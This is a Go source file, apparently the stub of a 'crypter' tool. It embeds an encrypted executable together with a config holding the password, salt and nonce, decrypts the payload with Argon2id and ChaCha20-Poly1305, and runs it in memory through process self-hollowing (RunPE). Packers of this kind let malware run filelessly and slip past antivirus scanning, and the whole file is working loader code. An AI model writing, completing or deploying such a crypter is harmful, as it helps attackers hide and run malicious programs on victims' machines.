package main

import (
	_ "embed"
	"encoding/hex"
	"fmt"
	"log"
	"strings"


	"golang.org/x/crypto/argon2"
	"golang.org/x/crypto/chacha20poly1305"
	"crypter/internal/runpe"
)

//go:embed encrypted_Input.bin
var encryptedBytes []byte

//go:embed config.txt
var configData string

// Default Argon2 parameters
const (
	argonTime    = 1
	argonMemory  = 64 * 1024
	argonThreads = 4
	argonKeyLen  = chacha20poly1305.KeySize
)

func main() {
	peBytes, err := decryptFile()
	if err != nil {
		log.Fatalf("Failed to decrypt file: %v", err)
	}
	fileless(peBytes)
}

func decryptFile() ([]byte, error) {
	// Parse config data (password, salt, nonce)
	lines := strings.Split(strings.TrimSpace(configData), "\n")
	if len(lines) < 3 {
		return nil, fmt.Errorf("invalid config data format")
	}

	password, err := hex.DecodeString(lines[0])
	if err != nil {
		return nil, err
	}

	salt, err := hex.DecodeString(lines[1])
	if err != nil {
		return nil, err
	}

	nonce, err := hex.DecodeString(lines[2])
	if err != nil {
		return nil, err
	}

	// Derive the key using the same Argon2id parameters
	key := argon2.IDKey(password, salt, argonTime, argonMemory, argonThreads, argonKeyLen)

	aead, err := chacha20poly1305.New(key)
	if err != nil {
		return nil, err
	}

	// Decrypt and verify the data
	decryptedBytes, err := aead.Open(nil, nonce, encryptedBytes, nil)
	if err != nil {
		return nil, err
	}

	return decryptedBytes, nil
}

func fileless(execBytes []byte) {
	// With self-hollowing, we no longer need a target process path
	// as the current process will be hollowed out and replaced
	log.Println("Starting self-hollowing process...")
	
	err := runpe.ExecuteInMemory(execBytes, "")
	if err != nil {
		log.Fatalf("Self-hollowing execution failed: %v", err)
	}
	
	// If we reach here, something went wrong as the process should have been replaced
	log.Println("Warning: Process continued execution after self-hollowing, this indicates a potential issue")
} 